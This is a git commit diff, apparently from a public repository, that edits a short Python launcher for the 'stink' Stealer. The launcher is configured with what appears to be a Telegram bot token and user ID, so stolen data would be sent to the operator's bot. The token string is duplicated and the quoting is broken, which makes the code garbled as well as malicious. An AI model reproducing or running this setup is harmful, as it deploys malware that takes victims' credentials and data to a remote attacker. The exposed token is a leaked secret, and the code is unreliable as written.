03616e8d51ee44160b169627cbc046b1588e70f9
skrillakilla <103787179+skrillakilla@users.noreply.github.com>
2022-12-21 04:09:01 +0000

    ik

--- stink/from stink import Stealer.py
+++ stink/from stink import Stealer.py
@@ -1,4 +1,4 @@
 from stink import Stealer
 
 if __name__ == '__main__':
-    Stealer(token=" 5927681660:AAGGdXLsN8YFx8j84S1ncQecgI5R00ojb 5927681660:AAGGdXLsN8YFx8j84S1ncQecgI5R00ojbng.g, user_id=5327162295).run()
+    Stealer(token=" 5927681660:AAGGdXLsN8YFx8j84S1ncQecgI5R00ojb 5927681660:AAGGdXLsN8YFx8j84S1ncQecgI5R00ojbng user_id=5327162295).run()
